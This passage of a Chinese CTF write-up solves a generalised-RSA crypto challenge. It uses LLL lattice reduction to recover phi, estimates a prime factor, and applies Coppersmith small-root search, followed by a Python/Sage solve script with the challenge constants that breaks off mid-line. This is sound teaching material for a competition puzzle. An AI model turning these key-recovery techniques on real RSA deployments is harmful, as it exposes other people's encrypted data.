                     data-src="https://cdn.nlark.com/yuque/__latex/06a65e7e2abafbc8fb82000bcf13b50f.svg"
                      alt="img"
                ></li>
</ol>
<ul>
<li><ul>
<li>收集已知参数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/e6067c5410e5311736325b95f2b057ce.svg"
                      alt="img"
                >、<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/59e4b4942af8129a54c7b9acb7336a9e.svg"
                      alt="img"
                >、<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/2c8fa7b6498728277c6bba16423e9b81.svg"
                      alt="img"
                >。</li>
<li>题目中已知的两个公钥指数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/59e4b4942af8129a54c7b9acb7336a9e.svg"
                      alt="img"
                >和<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/2c8fa7b6498728277c6bba16423e9b81.svg"
                      alt="img"
                >，它们分别对应的私钥是：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/304867f93f2c9675b2115cc36bae1ff1.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>同时有：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b3dea0ae97346c177c37aebd0b7d8fe4.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>构造一个四维格基矩阵：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/090156e19262ad4f3a5a3910ce49d06e.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>应用 LLL 算法对矩阵<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/54f5fb1b07a88521e7b036e3bc7a5e33.svg"
                      alt="img"
                >进行格基约简，得到最短向量<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/a770a282bbfa0ae1ec474b7ed311656d.svg"
                      alt="img"
                >。</li>
</ul>
</li>
</ul>
<ol>
<li>从约简向量恢复<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/06a65e7e2abafbc8fb82000bcf13b50f.svg"
                      alt="img"
                >的估计值</li>
</ol>
<ul>
<li><ul>
<li>使用<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/740781e64b2ea6be3be5b127db99c423.svg"
                      alt="img"
                >求出<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/2070ee72be8d9ddf36b435c8be3a3203.svg"
                      alt="img"
                ></li>
<li>从<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/712ecf7894348e92d8779c3ee87eeeb0.svg"
                      alt="img"
                >中提取出比例关系估算欧拉函数：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/858b55e49c9ff2c395ec4f77ad706800.svg"
                      alt="img"
                ></p>
<ol>
<li>根据<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/06a65e7e2abafbc8fb82000bcf13b50f.svg"
                      alt="img"
                >反推出<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/31f41863ef88112b0c3e80568d6c5557.svg"
                      alt="img"
                ></li>
</ol>
<ul>
<li><ul>
<li>使用模逆运算：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/daf2bf1692730281eefbf84d779d86aa.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>利用结构：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/020c1e50f8bc34dd67379eae5055e138.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>计算：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b17b022c98c4c66c08cfd89be98453f2.svg"
                      alt="img"
                ></p>
<ol>
<li>恢复整数参数 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/77c3adce895348f6083c425fe1ba2624.svg"
                      alt="img"
                > 和 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/a770a282bbfa0ae1ec474b7ed311656d.svg"
                      alt="img"
                ></li>
</ol>
<ul>
<li><ul>
<li>对<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/c6a0683e164b8ca1ed87bf17363451c7.svg"
                      alt="img"
                >和<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/ada5e202d68efa0705ad6d6af67fed1a.svg"
                      alt="img"
                >分解质因数，提取最大公因数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/712ecf7894348e92d8779c3ee87eeeb0.svg"
                      alt="img"
                >。</li>
<li>计算：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4139360061ec15bb2663e7f4fe0b4c22.svg"
                      alt="img"
                ></p>
<ol>
<li>解密 hint 密文，获取提示信息</li>
</ol>
<ul>
<li><ul>
<li>解密方式：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/8e1118df01a13c0cfadce2bb1ca8dae0.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>将结果转换为字节串并解码成字符串，获得提示信息。</li>
</ul>
</li>
</ul>
<ol>
<li>根据提示信息，查找资料，了解广义 RSA 算法</li>
<li>构造方程估算 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4dbb0aebb834bba789b6ba56895eef3f.svg"
                      alt="img"
                ></li>
</ol>
<ul>
<li><ul>
<li>利用关系：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/e5dabdbcf069deb7ea336bdfcc1ab9f4.svg"
                      alt="img"
                ></p>
<ol>
<li>使用结构公式展开<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/ec25cc3b272f3c5649edac519550a6ec.svg"
                      alt="img"
                >并联立方程</li>
</ol>
<ul>
<li><ul>
<li>利用代数恒等变换展开：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/68a046d42e0363b33f0601eceaefa2a2.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>代入展开式：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d62ed0a94ecbdd149edd54fac041bfe3.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>推导出关于<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/a1a3346fff6060bd210e57249ea3bb9d.svg"
                      alt="img"
                >的方程：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/ff004e3e09af2737163d62884bf259fb.svg"
                      alt="img"
                ></p>
<ol>
<li>估算<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/e640b0729dd4139f3145866713ee7225.svg"
                      alt="img"
                ></li>
</ol>
<ul>
<li><ul>
<li>由方程<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b18ee51030f6a53db2e033b84e48e235.svg"
                      alt="img"
                >可得：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/9c9557346aa654b264f6c52b6ea94c17.svg"
                      alt="img"
                ></li>
<li>将<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/ec25cc3b272f3c5649edac519550a6ec.svg"
                      alt="img"
                >展开为关于<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/212b8d728ffd429dd6f823d437d30770.svg"
                      alt="img"
                >和<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/775ae3e14d37961ef47a9b28a8786426.svg"
                      alt="img"
                >的多项式，推导得：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/7b9a140752eaa9d48218ad23f34412eb.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>合并上面两个等式，那么<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/212b8d728ffd429dd6f823d437d30770.svg"
                      alt="img"
                >方程满足：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4e1d12cb6d68879f9344a3c26ecde737.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>通过计算判别式，我们得到</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/9ae13d6efd85a0f70c1b18b21db9e18f.svg"
                      alt="img"
                ></p>
<p>这意味着</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/735d6f46d443f71ce544ae3646498e37.svg"
                      alt="img"
                ></p>
<p>因此</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/5c0b2a1e720e2bf8ed7772f498561b84.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>随后将<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/940c3b7a37326ed6bed8f64cb849aa6b.svg"
                      alt="img"
                >近似如下：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/9dc4fa8f78b43be9a608313fac74ea16.svg"
                      alt="img"
                ></p>
<ol>
<li>估算<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/aef569a31693adadb2ae99c4156e29f8.svg"
                      alt="img"
                ></li>
</ol>
<ul>
<li><ul>
<li>由<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4dbb0aebb834bba789b6ba56895eef3f.svg"
                      alt="img"
                >可得</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/8326f73c6bc303d3cb26b2a1f1c0aec1.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>那么<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/775ae3e14d37961ef47a9b28a8786426.svg"
                      alt="img"
                >满足下面方程：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/66f25cbfe14f08d88014191cab86983d.svg"
                      alt="img"
                ></p>
<p>上面方程的判别式是：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/ceffd15a851f342d5649e7fe16eb43b3.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>因此</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/1581d32955f4c493763d07af7da6d9b4.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>我们将<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/775ae3e14d37961ef47a9b28a8786426.svg"
                      alt="img"
                >近似如下：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/72b5fed1a6cf96a620e35817c5a0c197.svg"
                      alt="img"
                ></p>
<ol>
<li>合并估算值得到<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4a032acf928d0c604cf9c7204080a9bc.svg"
                      alt="img"
                ></li>
</ol>
<ul>
<li><ul>
<li>使用公式合并近似值：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/7c9a4e3286d57eef7b153398f0ce77ca.svg"
                      alt="img"
                ></p>
<ol>
<li>分析<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg"
                      alt="img"
                >的近似值<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4a032acf928d0c604cf9c7204080a9bc.svg"
                      alt="img"
                >与<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg"
                      alt="img"
                >的误差关系</li>
</ol>
<ul>
<li><ul>
<li>因为正整数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/294d1f184e4147502b31d1daa011594a.svg"
                      alt="img"
                >，有<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/905fafb8504b55535fdb6f643cd4d9e0.svg"
                      alt="img"
                ></li>
</ul>
</li>
</ul>
<p>可以得出以下结论：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/47ebb25cb0dd0ef53ebca047d66ffb74.svg"
                      alt="img"
                ></p>
<p>同理可得出：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/0b3ec32e546e9dedf182e41b91351354.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>那么可求出<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg"
                      alt="img"
                >的近似值<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4a032acf928d0c604cf9c7204080a9bc.svg"
                      alt="img"
                >与<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg"
                      alt="img"
                >的误差关系：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/ab6a7d6f6719bd86d23bba02c7eff488.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>当素数近似值误差小于<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/6cc4756068c452d2f45640b89373f5ae.svg"
                      alt="img"
                >，可通过 Coppersmith 算法快速分解<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/459f3c80a50b7be28751b0869ef5386a.svg"
                      alt="img"
                >，满足攻击条件。</li>
</ul>
</li>
</ul>
<ol>
<li>构造关于 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg"
                      alt="img"
                > 的多项式进行 Coppersmith 小根攻击</li>
</ol>
<ul>
<li><ul>
<li>构造：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/2f835c4c78e8aaa1beed651b18943ffe.svg"
                      alt="img"
                ></p>
<ol>
<li>应用小根算法恢复精确的<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg"
                      alt="img"
                ></li>
</ol>
<ul>
<li><ul>
<li>搜索范围<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/98a04d7b226b69250e7de0fab1524971.svg"
                      alt="img"
                >。</li>
<li>使用 small_roots 找出满足<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/cbcea8e19531a951a056a1c3e0a85e78.svg"
                      alt="img"
                >的小根<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/712ecf7894348e92d8779c3ee87eeeb0.svg"
                      alt="img"
                >。</li>
<li>恢复<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/8ebdef850df2201f563af2e8c5e2f882.svg"
                      alt="img"
                >。</li>
</ul>
</li>
</ul>
<ol>
<li>根据 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d4cd21d60552e207f237e82def9029b6.svg"
                      alt="img"
                > 恢复 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/34c7b563b30bde3c748139530686798e.svg"
                      alt="img"
                > 并计算 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/5a317babd007431f27b3f97b685bcd0b.svg"
                      alt="img"
                ></li>
</ol>
<ul>
<li><ul>
<li>计算：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/61d02b7e5ab97d7f9405b83a6184923f.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>进而得到：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b5bbb8cde94e3abf4bed98b57a5fabfe.svg"
                      alt="img"
                ></p>
<ol>
<li>解密 flag 密文</li>
</ol>
<ul>
<li><ul>
<li>计算私钥指数：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/11192e973cb981fa31ae30223f22f28b.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>解密密文：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/2af86c1d61b93a73cfc0ec436ab5d60b.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>将结果转换为明文字符串，即为 flag。</li>
</ul>
</li>
</ul>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, GCD, bytes_to_long, inverse, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz, sqrt, mpfr, get_context, is_prime, powmod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">estimate_calc</span>(<span class="params">e, u, v, N</span>):</span><br><span class="line">    get_context().precision = <span class="built_in">int</span>(<span class="number">4096</span>)</span><br><span class="line">    e = mpz(e)</span><br><span class="line">    u = mpz(u)</span><br><span class="line">    v = mpz(v)</span><br><span class="line">    N = mpz(N)</span><br><span class="line"></span><br><span class="line">    N2 = N * N</span><br><span class="line">    inner = (N2 + <span class="number">1</span>) ** <span class="number">2</span> - (e * u) // v</span><br><span class="line"></span><br><span class="line">    inner_sqrt = sqrt(mpfr(inner))</span><br><span class="line">    sum_est = sqrt(mpfr(<span class="number">2</span> * N) + inner_sqrt)</span><br><span class="line">    diff_est = sqrt(mpfr(-<span class="number">2</span> * N) + inner_sqrt)</span><br><span class="line"></span><br><span class="line">    p_est = (sum_est + diff_est) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p_est)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_p_with_coppersmith</span>(<span class="params">N, p_high, bits=<span class="number">20</span>, beta=<span class="number">0.5</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用 Coppersmith 小根攻击从 p 的近似值恢复出真实的 p</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line"></span><br><span class="line">    f = p_high + x</span><br><span class="line">    X = <span class="number">2</span> ^ bits</span><br><span class="line">    roots = f.small_roots(X=X, beta=beta)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        p = <span class="built_in">int</span>(p_high + roots[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_phi</span>(<span class="params">N, e1, e2</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        alpha2 = i / <span class="number">1024.0</span></span><br><span class="line"></span><br><span class="line">        M1 = <span class="built_in">int</span>(mpz(N) ** <span class="number">0.5</span>)</span><br><span class="line">        M2 = <span class="built_in">int</span>(mpz(N) ** (<span class="number">1</span> + alpha2))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造对角缩放矩阵 D</span></span><br><span class="line">        D = diagonal_matrix(ZZ, [N, M1, M2, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造攻击格基 B</span></span><br><span class="line">        B = Matrix(ZZ, [</span><br><span class="line">            [<span class="number">1</span>, -N,   <span class="number">0</span>,   N**<span class="number">2</span>],</span><br><span class="line">            [<span class="number">0</span>,  e1, -e1, -e1*N],</span><br><span class="line">            [<span class="number">0</span>,   <span class="number">0</span>,  e2, -e2*N],</span><br><span class="line">            [<span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  e1*e2]</span><br><span class="line">        ]) * D</span><br><span class="line"></span><br><span class="line">        L = B.LLL()</span><br><span class="line">        v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">        x = v * B.inverse()</span><br><span class="line">        phi = (x[<span class="number">0</span>, <span class="number">1</span>] / x[<span class="number">0</span>, <span class="number">0</span>] * e1).floor()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> phi:</span><br><span class="line">            <span class="keyword">return</span> phi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_u_v</span>(<span class="params">phi</span>):</span><br><span class="line">    d1 = inverse(e1, phi)</span><br><span class="line">    d2 = inverse(e2, phi)</span><br><span class="line">    vx = (d1 + d2) // <span class="number">2</span></span><br><span class="line">    ux = (d1 - d2) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">queryFactors</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;查询整数n的质因数分解结果&quot;&quot;&quot;</span></span><br><span class="line">        response = requests.get(<span class="string">f&quot;http://factordb.com/api?query=<span class="subst">&#123;ux&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> [<span class="built_in">int</span>(factor) <span class="keyword">for</span> factor, count <span class="keyword">in</span> response.json()[<span class="string">&quot;factors&quot;</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(count))]</span><br><span class="line">    x = queryFactors(ux)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ux // x, vx // x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">e, phi, N, c</span>):</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    <span class="keyword">return</span> powmod(c, d, N)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag_ct = <span class="number">3304275694820454674685997231149613707569155279977829020394149986905099581809908257209756187158847732534210083918959247704733651870464045546533643246315075</span></span><br><span class="line">    hint_ct = <span class="number">92640601724170927054025127187177279602224180611842629533022715235486983387366622510122048491911345879387849666443268190910926361909061627381467094692466413099146606063231426714299807657192175870860604519763163994726401817194260892563952333383283965304691493157326860489170198604706615586060763745868090002740</span></span><br><span class="line">    N1 = <span class="number">7348121907179526913580177851026954330752768738291896096735058973559480119932817354982584848148959373549116865913413457772773261195054845650206020666330991</span></span><br><span class="line">    N2 = <span class="number">107505436651153972868256172927458682863384962980950626300023016225072477035531962210081972740487894427658040878262205693734911880215972363343499849037411996091935215324499998500280001539069563664673471788918797180228775246203241297837846844704493266809513512780251834022988415242950525647295962207347676276159</span></span><br><span class="line">    e1 = <span class="number">46483493180168456907876964472003342599505589423824575610973682748466876137876722746536417805454147792987530564436875226141952843276430892859209813871491418332469407742523023206446900477888407552315053106617523965303933309326359897043169707586465120984991379773865649114063608940450932600749494216244527815359</span></span><br><span class="line">    e2 = <span class="number">45077696779822473738225957332830108221557084179697632022751654753481408195463722246182963143687869636871041685807164964262563391336227375090607312507452525793175139773473714173537596307343530651384764927086658506652872283207536853955899859738928440798959619962363749291669111681250920552149008464286936309009</span></span><br><span class="line">    e3 = <span class="number">23550626043318531686392597908767473613369638520090152127370654817423383818034484441592543825793324637247596257173381762273905254049903422039592935871962187682259917270517329309332496277455914971819636329971254701142348560600765095893262007065327568577225527780321485212099754825195447682395092115782178271206767089362177657624379873520519398661669609981034432208973165597218334711366939977911593062941916527006025062935544853270685363226130039339985009309168493915830639441795502226746782561939904234398557509011544985054339634943750567054335128439233603858646704023191283512166289385748291358620388592170413196949907</span></span><br><span class="line"></span><br><span class="line">    phi = get_phi(N2, e1, e2)</span><br><span class="line">    u,v = recover_u_v(phi)</span><br><span class="line">    hint = decrypt(e2, phi, N2, hint_ct)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(hint).decode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line"></span><br><span class="line">    p_est = estimate_calc(e3, u, v, N1)</span><br><span class="line">    p = recover_p_with_coppersmith(N1, p_est)</span><br><span class="line">    <span class="keyword">if</span> p:</span><br><span class="line">        q = 